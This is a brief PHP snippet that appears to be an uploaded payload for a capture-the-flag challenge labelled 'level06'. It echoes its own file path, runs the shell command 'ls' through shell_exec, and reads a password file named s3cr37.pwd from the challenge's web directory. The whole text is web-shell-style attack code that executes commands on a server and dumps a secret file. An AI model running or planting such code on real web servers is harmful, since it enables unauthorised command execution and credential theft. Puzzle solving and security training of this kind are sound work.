echo "Hello, world<br>";
echo __FILE__;
echo "<br>";
$output = shell_exec('ls');
echo "<pre>$output</pre>";
echo file_get_contents("/var/www/challenges/level06/public_html/cgi-bin/s3cr37.pwd");
